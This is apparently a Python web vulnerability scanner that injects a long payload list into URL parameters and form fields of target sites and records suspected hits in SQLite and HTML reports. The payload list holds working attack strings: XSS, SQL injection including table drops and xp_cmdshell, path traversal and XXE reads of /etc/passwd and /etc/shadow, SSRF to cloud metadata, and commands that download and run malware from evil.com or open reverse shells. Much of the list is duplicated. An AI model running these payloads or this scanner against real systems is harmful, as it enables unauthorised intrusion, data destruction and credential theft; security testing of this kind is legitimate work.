#!/usr/bin/env python3

import requests
import sqlite3
import argparse
import datetime
import logging
import html
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
import os
from termcolor import colored
import re
import joblib
import pandas as pd
import json  # Importing json module
import time

from multiprocessing import Pool, cpu_count

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()

# Configure logging
log_file = 'phpscan.log'
logging.basicConfig(
    filename=log_file,
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    encoding='utf-8'
)
console_handler = logging.StreamHandler()
console_handler.setLevel(logging.INFO)
console_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
logging.getLogger().addHandler(console_handler)

# Custom logging function with color
def log_with_color(level, message, color=None):
    if color:
        message = colored(message, color)
    if level == "info":
        logging.info(message)
    elif level == "debug":
        logging.debug(message)
    elif level == "error":
        logging.error(message)
    print(message)

# Database setup
def setup_database(db_name):
    conn = sqlite3.connect(db_name)
    c = conn.cursor()
    # URLs table
    c.execute('''
        CREATE TABLE IF NOT EXISTS urls (
            id INTEGER PRIMARY KEY, 
            url TEXT UNIQUE
        )
    ''')
    # Responses table
    c.execute('''
        CREATE TABLE IF NOT EXISTS responses (
            id INTEGER PRIMARY KEY, 
            url TEXT, 
            payload TEXT, 
            response TEXT, 
            timestamp TEXT,
            status TEXT
        )
    ''')
    # Vulnerabilities table
    c.execute('''
        CREATE TABLE IF NOT EXISTS vulnerabilities (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            url TEXT,
            parameter TEXT,
            payload TEXT,
            cwe TEXT,
            result TEXT,
            response_snippet TEXT,
            timestamp TEXT
        )
    ''')
    conn.commit()
    return conn, c

# Payloads list covering OWASP Top 10

# Payloads list
payloads = [
    # Cross-Site Scripting (CWE-79)
    "<script>alert('XSS');</script>",
    "\"><script>alert('XSS');</script>",
    "'><script>alert('XSS');</script>",
    "<IMG SRC=javascript:alert('XSS')>",
    "<BODY ONLOAD=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<iframe src='javascript:alert(\"XSS\")'>",
    "<div onmouseover=alert('XSS')>Hover me!</div>",
    "javascript:alert('XSS');",
    "<IMG SRC=javascript:alert('XSS')>",

    # SQL Injection (CWE-89)
    "' OR '1'='1'; -- -",
    "'; DROP TABLE users; --",
    "' OR '1'='1' --",
    "\" OR \"1\"=\"1\" --",
    "\"; DROP TABLE users; --",
    "' OR '1'='1' /*",
    "' OR '1'='1' #",
    "' UNION SELECT NULL, username, password FROM users; --",
    "1 OR 1=1",
    "'; EXEC xp_cmdshell('dir'); --",

    # Command Injection (CWE-78)
    "1; ls -la; echo vulnerable123",
    "php://filter/convert.base64-encode/resource=index.php; echo vulnerable123",
    "../../../../etc/passwd; echo vulnerable123",
    "ping -c 4 127.0.0.1; echo vulnerable123",
    "uname -a; echo vulnerable123",
    "whoami; echo vulnerable123",
    "dir C:\\Windows; echo vulnerable123",
    "netstat -an; echo vulnerable123",
    "id; echo vulnerable123",

    # Insecure Direct Object Reference (IDOR)
    "4",
    "admin",
    "guest",
    "secret_doc.pdf",
    "confidential.txt",
    "1001",
    "abc123",
    "user123",
    "item567",
    "TCKT7890",

    # Missing Authorization (CWE-862)
    "admin",
    "administrator",
    "all",
    "superuser",
    "full_control",
    "root",
    "debug",
    "active",
    "override",
    "unrestricted",

    # File Inclusion (CWE-95, CWE-98)
    "../../../../etc/passwd; echo vulnerable123",
    "php://filter/convert.base64-encode/resource=index.php; echo vulnerable123",
    "../../../../../../etc/passwd; echo vulnerable123",
    "../../config.php; echo vulnerable123",
    "../../var/www/html/.htaccess; echo vulnerable123",
    "php://input; echo vulnerable123",
    "../../../../etc/shadow; echo vulnerable123",
    "php://filter/convert.base64-encode/resource=../../../config.php; echo vulnerable123",
    "../../../../../../windows/system32/drivers/etc/hosts; echo vulnerable123",
    "../../../../../../etc/hosts; echo vulnerable123",

    # Sensitive Data Exposure (SDE - CWE-200 series)
    "some_secret_data; echo vulnerable123",
    "1234567890; echo vulnerable123",
    "abcdef123456; echo vulnerable123",
    "xyz789; echo vulnerable123",
    "tokenABC123; echo vulnerable123",
    "username:admin; echo vulnerable123",
    "admin123; echo vulnerable123",
    "P@ssw0rd!; echo vulnerable123",
    "123456; echo vulnerable123",
    "letmein; echo vulnerable123",

    # Missing Encryption of Sensitive Data (CWE-311)
    "admin123; echo vulnerable123",
    "abcdef123456; echo vulnerable123",
    "s3cr3tK3y!; echo vulnerable123",
    "false; echo vulnerable123",
    "off; echo vulnerable123",
    "no; echo vulnerable123",
    "none; echo vulnerable123",
    "AES; echo vulnerable123",
    "MD5; echo vulnerable123",
    "SHA1; echo vulnerable123",

    # Use of a Broken or Risky Cryptographic Algorithm (CWE-327)
    "MD5; echo vulnerable123",
    "SHA1; echo vulnerable123",
    "md5(); echo vulnerable123",
    "sha1(); echo vulnerable123",
    "des; echo vulnerable123",
    "rc4; echo vulnerable123",
    "bcrypt; echo vulnerable123",
    "md5; echo vulnerable123",
    "sha1; echo vulnerable123",
    "rc4; echo vulnerable123",

    # Security Misconfiguration (SM)
    "true; echo vulnerable123",
    "production; echo vulnerable123",
    "default; echo vulnerable123",
    "debug; echo vulnerable123",
    "verbose; echo vulnerable123",
    "all; echo vulnerable123",
    "show_errors; echo vulnerable123",
    "1; echo vulnerable123",
    "on; echo vulnerable123",
    "1; echo vulnerable123",

    # Information Exposure Through an Error Message (CWE-209)
    "1; echo vulnerable123",
    "null; echo vulnerable123",
    "status; echo vulnerable123",
    "fail; echo vulnerable123",
    "details; echo vulnerable123",
    "stacktrace; echo vulnerable123",
    "true; echo vulnerable123",
    "on; echo vulnerable123",
    "enable; echo vulnerable123",
    "1; echo vulnerable123",

    # URL Redirection to Untrusted Site (CWE-601)
    "http://evil.com; echo vulnerable123",
    "https://evil.com; echo vulnerable123",
    "http://malicious.com; echo vulnerable123",
    "https://phishing.com; echo vulnerable123",
    "http://badsite.com; echo vulnerable123",
    "https://fraud.com; echo vulnerable123",
    "http://scam.com; echo vulnerable123",
    "https://malware.com; echo vulnerable123",
    "http://attackersite.com; echo vulnerable123",
    "https://phishing-site.com; echo vulnerable123",

    # LDAP Injection (CWE-90)
    ")(objectClass=*)(&); echo vulnerable123",
    "admin*))(|(uid=*))(&); echo vulnerable123",
    "*)(uid=*))(|(objectClass=*); echo vulnerable123",
    "*)(objectClass=*)(|(&(uid=*))(&); echo vulnerable123",
    ")(|(uid=*))(&); echo vulnerable123",
    "(*)(uid=*))(|(objectClass=*); echo vulnerable123",
    "(&(uid=*))(|(objectClass=*)); echo vulnerable123",
    "(*)(uid=*))(|(objectClass=*)); echo vulnerable123",
    "*(uid=*))(|(objectClass=*)); echo vulnerable123",
    "*(uid=*))(|(objectClass=*)); echo vulnerable123",

    # XML Injection (CWE-91)
    "<xml><test>vulnerable123</test></xml>; echo vulnerable123",
    "<?xml version='1.0'?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM 'file:///etc/passwd'> ]><foo>&xxe;</foo>; echo vulnerable123",
    "<data><item>vulnerable123</item></data>; echo vulnerable123",
    "<?xml version='1.0'?><!DOCTYPE foo [ <!ENTITY yyy SYSTEM 'file:///etc/shadow'> ]><foo>&yyy;</foo>; echo vulnerable123",
    "<request><user>vulnerable123</user></request>; echo vulnerable123",
    "<?xml version='1.0'?><!DOCTYPE foo [ <!ENTITY zzz SYSTEM 'file:///etc/hosts'> ]><foo>&zzz;</foo>; echo vulnerable123",
    "<message><content>vulnerable123</content></message>; echo vulnerable123",
    "<?xml version='1.0'?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM 'file:///etc/group'> ]><foo>&xxe;</foo>; echo vulnerable123",
    "<document><title>vulnerable123</title></document>; echo vulnerable123",
    "<?xml version='1.0'?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM 'file:///var/www/html/.htpasswd'> ]><foo>&xxe;</foo>; echo vulnerable123",

    # Remote Code Execution (CWE-77)
    "echo vulnerable123 | nc -lvp 4444",
    "wget http://evil.com/malware.sh -O /tmp/malware.sh; bash /tmp/malware.sh; echo vulnerable123",
    "curl http://evil.com/malware.exe -o malware.exe && chmod +x malware.exe && ./malware.exe; echo vulnerable123",
    "nc -e /bin/bash 127.0.0.1 8080; echo vulnerable123",
    "perl -e 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);exec(\"/bin/sh -i\");'; echo vulnerable123",
    "php -r '$sock=fsockopen(\"127.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'; echo vulnerable123",
    "echo vulnerable123 | telnet 127.0.0.1 4444; echo vulnerable123",
    "echo vulnerable123 | socat tcp-connect:127.0.0.1:4444 exec:/bin/bash; echo vulnerable123",
    "nc -nv 127.0.0.1 4444 -e /bin/sh; echo vulnerable123",

    # Cross-Site Request Forgery (CWE-352)
    "bad_token; echo vulnerable123",
    "invalid_token; echo vulnerable123",
    "expired; echo vulnerable123",
    "delete_user; echo vulnerable123",
    "change_password; echo vulnerable123",
    "transfer_funds; echo vulnerable123",
    "update_settings; echo vulnerable123",
    "reset_credentials; echo vulnerable123",
    "modify_profile; echo vulnerable123",
    "remove_account; echo vulnerable123",

    # Server-Side Request Forgery (CWE-918)
    "http://localhost:8080/admin; echo vulnerable123",
    "http://127.0.0.1:8000/secret; echo vulnerable123",
    "http://internal.server/admin; echo vulnerable123",
    "http://192.168.1.1/config; echo vulnerable123",
    "http://169.254.169.254/latest/meta-data/; echo vulnerable123",
    "http://localhost:5000/debug; echo vulnerable123",
    "http://10.0.0.1/health; echo vulnerable123",
    "http://localhost:9000/status; echo vulnerable123",
    "http://internal-service/data; echo vulnerable123",
    "http://127.0.0.1:3000/api; echo vulnerable123",

    # Broken Access Control (A01:2021)
    # Attempt to access admin panels or restricted resources
    "/admin/dashboard.php; echo vulnerable123",
    "/admin/settings.php; echo vulnerable123",
    "/admin/config.php; echo vulnerable123",
    "/user/../../admin/config.php; echo vulnerable123",
    "/user/1001/profile.php; echo vulnerable123",
    "/user/1002/settings.php; echo vulnerable123",
    "/orders/1234/details.php; echo vulnerable123",
    "/billing/../../admin/payment.php; echo vulnerable123",
    "/secret_area.php; echo vulnerable123",
    "/hidden/admin.php; echo vulnerable123",

    # Cryptographic Failures (A02:2021)
    # Attempting to manipulate encrypted data or test weak encryption
    "password=admin123; echo vulnerable123",
    "token=abcdef123456; echo vulnerable123",
    "hash=5f4dcc3b5aa765d61d8327deb882cf99; echo vulnerable123",  # MD5 for 'password'
    "hash=e99a18c428cb38d5f260853678922e03; echo vulnerable123",  # MD5 for 'abc123'
    "encrypted_data=U2FsdGVkX19fTms3OENxUg==; echo vulnerable123",  # Example encrypted string
    "ciphertext=5d41402abc4b2a76b9719d911017c592; echo vulnerable123",  # MD5 for 'hello'
    "aes_key=00112233445566778899aabbccddeeff; echo vulnerable123",
    "rsa_key=MIICXAIBAAKBgQC7...; echo vulnerable123",  # Truncated RSA key
    "cipher=DES; echo vulnerable123",
    "cipher=RC4; echo vulnerable123",

    # Insecure Design (A04:2021)
    # Business logic attacks or attempts to exploit design flaws
    "purchase=1000&discount=50; echo vulnerable123",
    "apply_coupon=SUMMER2025; echo vulnerable123",
    "transfer_amount=999999; echo vulnerable123",
    "reset_balance=true; echo vulnerable123",
    "upgrade_account=admin; echo vulnerable123",
    "change_role=superuser; echo vulnerable123",
    "increase_quota=unlimited; echo vulnerable123",
    "set_privileges=all; echo vulnerable123",
    "unlock_account=true; echo vulnerable123",
    "modify_permissions=admin; echo vulnerable123",

    # Vulnerable and Outdated Components (A06:2021)
    # Payloads targeting known vulnerabilities in outdated components
    # Example: Exploit for a known CVE in a specific version
    "CVE-2020-12345; echo vulnerable123",
    "CVE-2019-54321; echo vulnerable123",
    "OutdatedLib=1.0.0; echo vulnerable123",
    "vulnerable_plugin=old_version; echo vulnerable123",
    "deprecated_module=true; echo vulnerable123",
    "legacy_system=1; echo vulnerable123",
    "php_version=5.6; echo vulnerable123",
    "framework_version=3.2; echo vulnerable123",
    "cms_version=2.1; echo vulnerable123",
    "library_version=0.9; echo vulnerable123",

    # Identification and Authentication Failures (A07:2021)
    # Payloads for brute force, session fixation, or credential stuffing
    "username=admin&password=admin123; echo vulnerable123",
    "login=true&user=guest&pass=guest123; echo vulnerable123",
    "sessionid=abcd1234; echo vulnerable123",
    "auth_token=invalidtoken; echo vulnerable123",
    "csrf_token=badtoken; echo vulnerable123",
    "remember_me=true; echo vulnerable123",
    "password_reset=true; echo vulnerable123",
    "change_password=true&new_password=newpass123; echo vulnerable123",
    "authenticate=1; echo vulnerable123",
    "login_attempt=failed; echo vulnerable123",

    # Software and Data Integrity Failures (A08:2021)
    # Payloads to inject malicious code or tamper with data
    "data=<script>malicious()</script>; echo vulnerable123",
    "content=<iframe src='evil.com'></iframe>; echo vulnerable123",
    "file=<img src=x onerror=alert('integrity');>; echo vulnerable123",
    "data=<object data='http://evil.com/evil.swf'></object>; echo vulnerable123",
    "payload=<embed src='http://evil.com/malware.swf'>; echo vulnerable123",
    "input=<applet code='Evil.class' width=200 height=200></applet>; echo vulnerable123",
    "code=<meta http-equiv='refresh' content='0;url=http://evil.com'>; echo vulnerable123",
    "redirect=<script>window.location='http://evil.com'</script>; echo vulnerable123",
    "image=<img src='javascript:alert(\"Integrity\")'>; echo vulnerable123",

    # Security Logging and Monitoring Failures (A09:2021)
    # Payloads attempting to evade logging or generate noise
    "log_test=normal_request; echo vulnerable123",
    "noise_payload=abcd1234; echo vulnerable123",
    "attempt=hidden; echo vulnerable123",
    "test_logging=true; echo vulnerable123",
    "debug_mode=true; echo vulnerable123",
    "verbose_output=true; echo vulnerable123",
    "silent=true; echo vulnerable123",
    "log_level=debug; echo vulnerable123",
    "trace=true; echo vulnerable123",
    "hidden_payload=xyz789; echo vulnerable123",

    # Broken Access Control (A01:2021)
    # Attempt to access admin panels or restricted resources
    "/admin/dashboard.php; echo vulnerable123",
    "/admin/settings.php; echo vulnerable123",
    "/admin/config.php; echo vulnerable123",
    "/user/../../admin/config.php; echo vulnerable123",
    "/user/1001/profile.php; echo vulnerable123",
    "/user/1002/settings.php; echo vulnerable123",
    "/orders/1234/details.php; echo vulnerable123",
    "/billing/../../admin/payment.php; echo vulnerable123",
    "/secret_area.php; echo vulnerable123",
    "/hidden/admin.php; echo vulnerable123",

    # Cryptographic Failures (A02:2021)
    # Attempting to manipulate encrypted data or test weak encryption
    "password=admin123; echo vulnerable123",
    "token=abcdef123456; echo vulnerable123",
    "hash=5f4dcc3b5aa765d61d8327deb882cf99; echo vulnerable123",  # MD5 for 'password'
    "hash=e99a18c428cb38d5f260853678922e03; echo vulnerable123",  # MD5 for 'abc123'
    "encrypted_data=U2FsdGVkX19fTms3OENxUg==; echo vulnerable123",  # Example encrypted string
    "ciphertext=5d41402abc4b2a76b9719d911017c592; echo vulnerable123",  # MD5 for 'hello'
    "aes_key=00112233445566778899aabbccddeeff; echo vulnerable123",
    "rsa_key=MIICXAIBAAKBgQC7...; echo vulnerable123",  # Truncated RSA key
    "cipher=DES; echo vulnerable123",
    "cipher=RC4; echo vulnerable123",


    # Insecure Design (A04:2021)
    # Business logic attacks or attempts to exploit design flaws
    "purchase=1000&discount=50; echo vulnerable123",
    "apply_coupon=SUMMER2025; echo vulnerable123",
    "transfer_amount=999999; echo vulnerable123",
    "reset_balance=true; echo vulnerable123",
    "upgrade_account=admin; echo vulnerable123",
    "change_role=superuser; echo vulnerable123",
    "increase_quota=unlimited; echo vulnerable123",
    "set_privileges=all; echo vulnerable123",
    "unlock_account=true; echo vulnerable123",
    "modify_permissions=admin; echo vulnerable123",



    # Vulnerable and Outdated Components (A06:2021)
    # Payloads targeting known vulnerabilities in outdated components
    # Example: Exploit for a known CVE in a specific version
    "CVE-2020-12345; echo vulnerable123",
    "CVE-2019-54321; echo vulnerable123",
    "OutdatedLib=1.0.0; echo vulnerable123",
    "vulnerable_plugin=old_version; echo vulnerable123",
    "deprecated_module=true; echo vulnerable123",
    "legacy_system=1; echo vulnerable123",
    "php_version=5.6; echo vulnerable123",
    "framework_version=3.2; echo vulnerable123",
    "cms_version=2.1; echo vulnerable123",
    "library_version=0.9; echo vulnerable123",


    # Identification and Authentication Failures (A07:2021)
    # Payloads for brute force, session fixation, or credential stuffing
    "username=admin&password=admin123; echo vulnerable123",
    "login=true&user=guest&pass=guest123; echo vulnerable123",
    "sessionid=abcd1234; echo vulnerable123",
    "auth_token=invalidtoken; echo vulnerable123",
    "csrf_token=badtoken; echo vulnerable123",
    "remember_me=true; echo vulnerable123",
    "password_reset=true; echo vulnerable123",
    "change_password=true&new_password=newpass123; echo vulnerable123",
    "authenticate=1; echo vulnerable123",
    "login_attempt=failed; echo vulnerable123",


    # Software and Data Integrity Failures (A08:2021)
    # Payloads to inject malicious code or tamper with data
    "data=<script>malicious()</script>; echo vulnerable123",
    "content=<iframe src='evil.com'></iframe>; echo vulnerable123",
    "file=<img src=x onerror=alert('integrity');>; echo vulnerable123",
    "json={\"key\": \"value\", \"malicious\": \"<script>alert('integrity');</script>}; echo vulnerable123",
    "data=<object data='http://evil.com/evil.swf'></object>; echo vulnerable123",
    "payload=<embed src='http://evil.com/malware.swf'>; echo vulnerable123",
    "input=<applet code='Evil.class' width=200 height=200></applet>; echo vulnerable123",
    "code=<meta http-equiv='refresh' content='0;url=http://evil.com'>; echo vulnerable123",
    "redirect=<script>window.location='http://evil.com'</script>; echo vulnerable123",
    "image=<img src='javascript:alert(\"Integrity\")'>; echo vulnerable123",


    # Security Logging and Monitoring Failures (A09:2021)
    # Payloads attempting to evade logging or generate noise
    "log_test=normal_request; echo vulnerable123",
    "noise_payload=abcd1234; echo vulnerable123",
    "attempt=hidden; echo vulnerable123",
    "test_logging=true; echo vulnerable123",
    "debug_mode=true; echo vulnerable123",
    "verbose_output=true; echo vulnerable123",
    "silent=true; echo vulnerable123",
    "log_level=debug; echo vulnerable123",
    "trace=true; echo vulnerable123",
    "hidden_payload=xyz789; echo vulnerable123",


]


# Function to fetch and parse a URL
def fetch_and_parse_url(url):
    try:
        response = requests.get(url, timeout=10, verify=False)
        response.raise_for_status()
        if response.status_code == 200:
            content = response.text
            soup = BeautifulSoup(content, 'html.parser')
            return soup
    except requests.exceptions.RequestException as e:
        log_with_color("error", f"Error fetching {url}: {e}", "red")
    return None

# Function to inject payloads into URL parameters
def test_url_parameters(url, payloads, model, db_name, save_options):
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    if not query_params:
        # No query parameters to test
        return

    for param in query_params:
        for payload in payloads:
            # Create a copy of the original query parameters
            injected_params = query_params.copy()
            # Inject the payload into the current parameter
            injected_params[param] = payload

            # Reconstruct the URL with injected payload
            new_query = urlencode(injected_params, doseq=True)
            injected_url = urlunparse(parsed_url._replace(query=new_query))

            log_with_color("info", f"Injecting payload into URL parameter: {param}={payload}", "cyan")
            try:
                response = requests.get(injected_url, timeout=10, verify=False)
                status = response.status_code
                timestamp = datetime.datetime.now().isoformat()

                # Determine if the response should be saved based on status codes
                should_save = False

                if save_options['save_all']:
                    should_save = True
                elif save_options['save200_only'] and status == 200:
                    should_save = True
                elif save_options['custom_statuses'] and status in save_options['custom_statuses']:
                    should_save = True

                # Apply filtering if --filterresponse is enabled
                if should_save and save_options['filter_response']:
                    # Refined regex to ensure proper grouping
                    if response.text and not re.match(r'(?i)^\s*<!DOCTYPE\s+html', response.text):
                        should_save = True
                        log_with_color("debug", f"Response passed filter: {injected_url}", "blue")
                    else:
                        should_save = False
                        log_with_color("debug", f"Response filtered out: {injected_url}", "blue")

                if should_save:
                    # Insert into responses table
                    conn, cursor = setup_database(db_name)
                    cursor.execute(
                        "INSERT INTO responses (url, payload, response, timestamp, status) VALUES (?, ?, ?, ?, ?)",
                        (injected_url, payload, response.text, timestamp, status)
                    )
                    conn.commit()
                    conn.close()
                    log_with_color("debug", f"Saved response: {injected_url}", "green")

                # Check for vulnerability indicators
                vulnerability_detected = False
                if "vulnerable123" in response.text:
                    vulnerability_detected = True
                elif payload.split(";")[0] in response.text:
                    vulnerability_detected = True  # For XSS

                if model:
                    vulnerability_detected = vulnerability_detected or is_vulnerable_ai(response.text, model)

                if vulnerability_detected:
                    # Only log vulnerability if the response was saved
                    if should_save:
                        cwe = get_cwe_for_payload(payload)
                        log_vulnerability(url, f"{param}={payload}", cwe, response.text, timestamp, db_name)
                    else:
                        log_with_color("debug", f"Vulnerability detected but response was filtered out for URL: {injected_url}", "yellow")
            except requests.exceptions.RequestException as e:
                log_with_color("error", f"Error injecting payload into {injected_url}: {e}", "red")
                continue

# Function to get CWE based on payload
def get_cwe_for_payload(payload):
    # This function maps payloads to their CWE based on predefined patterns
    # For simplicity, we use substrings to identify the CWE
    if "<script>" in payload or "javascript:" in payload:
        return "CWE-79"  # XSS
    elif "' OR '1'='1'" in payload or "'; DROP TABLE" in payload:
        return "CWE-89"  # SQL Injection
    elif "echo vulnerable123" in payload and any(cmd in payload for cmd in ["ls", "ping", "uname", "whoami", "dir", "netstat", "id"]):
        return "CWE-78"  # Command Injection
    elif "http://" in payload or "https://" in payload:
        return "CWE-601"  # URL Redirection
    # Add more mappings as needed
    else:
        return "Unknown CWE"

# Function to inject payloads into form fields
def test_forms(url, soup, payloads, model, db_name, save_options):
    forms = soup.find_all('form')
    for form in forms:
        action = form.get('action')
        method = form.get('method', 'get').lower()

        # Construct target URL
        target_url = urljoin(url, action) if action else url

        # Extract input fields
        input_fields = form.find_all(['input', 'textarea', 'select'])
        form_data = {}
        for field in input_fields:
            name = field.get('name')
            if not name:
                continue
            field_type = field.get('type', 'text')
            form_data[name] = "test"  # Default value

        if not form_data:
            log_with_color("info", f"No input fields found in form at {url}", "yellow")
            continue

        for param in form_data:
            for payload in payloads:
                log_with_color("info", f"Injecting payload into form field: {param}={payload}", "cyan")
                test_data = form_data.copy()
                test_data[param] = payload

                try:
                    if method == 'post':
                        response = requests.post(target_url, data=test_data, timeout=10, verify=False)
                    else:
                        response = requests.get(target_url, params=test_data, timeout=10, verify=False)
                    status = response.status_code
                    timestamp = datetime.datetime.now().isoformat()

                    # Determine if the response should be saved based on status codes
                    should_save = False

                    if save_options['save_all']:
                        should_save = True
                    elif save_options['save200_only'] and status == 200:
                        should_save = True
                    elif save_options['custom_statuses'] and status in save_options['custom_statuses']:
                        should_save = True

                    # Apply filtering if --filterresponse is enabled
                    if should_save and save_options['filter_response']:
                        # Refined regex to ensure proper grouping
                        if response.text and not re.match(r'(?i)^\s*<!DOCTYPE\s+html', response.text):
                            should_save = True
                            log_with_color("debug", f"Response passed filter: {target_url}", "blue")
                        else:
                            should_save = False
                            log_with_color("debug", f"Response filtered out: {target_url}", "blue")

                    if should_save:
                        # Insert into responses table
                        conn, cursor = setup_database(db_name)
                        cursor.execute(
                            "INSERT INTO responses (url, payload, response, timestamp, status) VALUES (?, ?, ?, ?, ?)",
                            (target_url, payload, response.text, timestamp, status)
                        )
                        conn.commit()
                        conn.close()
                        log_with_color("debug", f"Saved response: {target_url}", "green")

                    # Check for vulnerability indicators
                    vulnerability_detected = False
                    if "vulnerable123" in response.text:
                        vulnerability_detected = True
                    elif payload.split(";")[0] in response.text:
                        vulnerability_detected = True  # For XSS

                    if model:
                        vulnerability_detected = vulnerability_detected or is_vulnerable_ai(response.text, model)

                    if vulnerability_detected:
                        # Only log vulnerability if the response was saved
                        if should_save:
                            cwe = get_cwe_for_payload(payload)
                            log_vulnerability(url, f"{param}={payload}", cwe, response.text, timestamp, db_name)
                        else:
                            log_with_color("debug", f"Vulnerability detected but response was filtered out for URL: {target_url}", "yellow")
                except requests.exceptions.RequestException as e:
                    log_with_color("error", f"Error injecting payload into form at {target_url}: {e}", "red")
                    continue

# Function to log vulnerabilities
def log_vulnerability(url, payload, cwe, response_text, timestamp, db_name):
    snippet = response_text[:500] + '...' if len(response_text) > 500 else response_text
    log_msg = colored(f"[{cwe}] Vulnerability Found: {url}", "red") if cwe != "Unknown CWE" else colored(f"Vulnerability Found: {url}", "red")
    log_with_color("info", log_msg)
    log_with_color("info", f"Payload: {payload}", "yellow")
    log_with_color("info", f"Response Snippet: {snippet}", "cyan")

    # Insert into vulnerabilities table
    conn, cursor = setup_database(db_name)
    cursor.execute(
        "INSERT INTO vulnerabilities (url, parameter, payload, cwe, result, response_snippet, timestamp) VALUES (?, ?, ?, ?, ?, ?, ?)",
        (url, payload.split('=')[0] if '=' in payload else 'N/A', payload, cwe, 'Vulnerable', snippet, timestamp)
    )
    conn.commit()
    conn.close()

# Worker function for multiprocessing (defined at top level)
def worker(task):
    url, payloads, model, db_name, save_options = task
    # Test URL parameters
    test_url_parameters(url, payloads, model, db_name, save_options)

    # Fetch and parse the URL again for form testing
    soup = fetch_and_parse_url(url)
    if soup:
        test_forms(url, soup, payloads, model, db_name, save_options)

# Function to load domains from a file
def load_domains_from_file(file_path):
    try:
        with open(file_path, 'r') as file:
            domains = [line.strip() for line in file if line.strip()]
        return domains
    except Exception as e:
        log_with_color("error", f"Error loading domains from {file_path}: {e}", "red")
        return []

# AI Model Loading and Feature Extraction
def load_model_func(model_path='vuln_model.pkl'):
    if not os.path.exists(model_path):
        log_with_color("error", f"AI model file '{model_path}' not found. Please train the model first.", "red")
        return None
    model = joblib.load(model_path)
    log_with_color("info", "AI model loaded successfully.", "green")
    return model

def extract_features(response_text):
    features = {}
    features['length'] = len(response_text)
    features['contains_error'] = int(bool(re.search(r'(error|warning|fatal)', response_text, re.I)))
    features['num_sql_errors'] = len(re.findall(r'(SQL syntax|mysql_fetch)', response_text, re.I))
    features['contains_sensitive_files'] = int(bool(re.search(r'(root:|password|shadow|etc/passwd|vulnerable123)', response_text, re.I)))
    features['contains_unique_indicator'] = int(bool(re.search(r'vulnerable123', response_text)))
    return features

def is_vulnerable_ai(response_text, model):
    if not model:
        return False
    features = extract_features(response_text)
    df = pd.DataFrame([features])
    prediction = model.predict(df)
    return prediction[0] == 1  # 1 indicates Vulnerable

# Function to train the AI model
def train_model(db_name, model_path='vuln_model.pkl'):
    from sklearn.linear_model import LogisticRegression
    from sklearn.model_selection import train_test_split
    from sklearn.metrics import classification_report

    conn = sqlite3.connect(db_name)
    df = pd.read_sql_query("SELECT * FROM responses", conn)
    conn.close()

    if df.empty:
        log_with_color("error", "No data available in the database to train the model.", "red")
        return

    # Label encoding: 'Vulnerable' = 1, others = 0
    df['label'] = df['status'].apply(lambda x: 1 if 'Vulnerable' in x else 0)

    # Drop rows with null responses
    df = df.dropna(subset=['response'])

    # Extract features
    feature_list = []
    for response in df['response']:
        features = extract_features(response)
        feature_list.append(features)
    features_df = pd.DataFrame(feature_list)

    # Handle missing features
    features_df = features_df.fillna(0)

    X = features_df
    y = df['label']

    # Split the data
    X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)

    # Initialize and train the model
    model = LogisticRegression(max_iter=1000)
    model.fit(X_train, y_train)

    # Evaluate the model
    predictions = model.predict(X_test)
    report = classification_report(y_test, predictions)
    print("Model Training Completed. Classification Report:")
    print(report)
    log_with_color("info", "Model training completed. Classification report printed above.", "green")

    # Save the model
    joblib.dump(model, model_path)
    log_with_color("info", f"Trained model saved as '{model_path}'.", "cyan")

# Function to generate HTML report
def generate_html_report(cursor, report_filename, vulnerabilities_only=False):
    if vulnerabilities_only:
        cursor.execute("SELECT * FROM vulnerabilities")
    else:
        cursor.execute("SELECT * FROM responses")
    rows = cursor.fetchall()

    html_content = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Code InjectionScan Report</title>
        <style>
            table {
                width: 100%;
                border-collapse: collapse;
            }
            th, td {
                border: 1px solid #ddd;
                padding: 8px;
                word-wrap: break-word;
            }
            th {
                background-color: #f2f2f2;
                text-align: left;
            }
            .vulnerable {
                background-color: #f8d7da;
            }
            .secure {
                background-color: #d4edda;
            }
        </style>
    </head>
    <body>
        <h1>Code InjectionScan Report</h1>
        <table>
            <tr>
    """

    if vulnerabilities_only:
        html_content += """
                <th>ID</th>
                <th>URL</th>
                <th>Parameter</th>
                <th>Payload</th>
                <th>CWE</th>
                <th>Result</th>
                <th>Response Snippet</th>
                <th>Timestamp</th>
        """
    else:
        html_content += """
                <th>ID</th>
                <th>URL</th>
                <th>Payload</th>
                <th>Response</th>
                <th>Timestamp</th>
                <th>Status</th>
        """

    html_content += "</tr>"

    for row in rows:
        if vulnerabilities_only:
            _, url, parameter, payload, cwe, result, response_snippet, timestamp = row
            status_class = "vulnerable" if result == "Vulnerable" else "secure"
            html_content += f"""
                <tr class="{status_class}">
                    <td>{row[0]}</td>
                    <td>{html.escape(url)}</td>
                    <td>{html.escape(parameter)}</td>
                    <td>{html.escape(payload)}</td>
                    <td>{html.escape(cwe)}</td>
                    <td>{html.escape(result)}</td>
                    <td>{html.escape(response_snippet)}</td>
                    <td>{html.escape(timestamp)}</td>
                </tr>
            """
        else:
            _, url, payload, response, timestamp, status = row
            status_class = "vulnerable" if 'Vulnerable' in status else "secure"
            html_content += f"""
                <tr class="{status_class}">
                    <td>{row[0]}</td>
                    <td>{html.escape(url)}</td>
                    <td>{html.escape(payload)}</td>
                    <td>{html.escape(response[:500])}...</td>
                    <td>{html.escape(timestamp)}</td>
                    <td>{html.escape(status)}</td>
                </tr>
            """

    html_content += """
        </table>
    </body>
    </html>
    """

    try:
        with open(report_filename, "w", encoding='utf-8') as f:
            f.write(html_content)
        log_with_color("info", f"HTML report generated: {report_filename}", "cyan")
    except Exception as e:
        log_with_color("error", f"Error generating HTML report: {e}", "red")

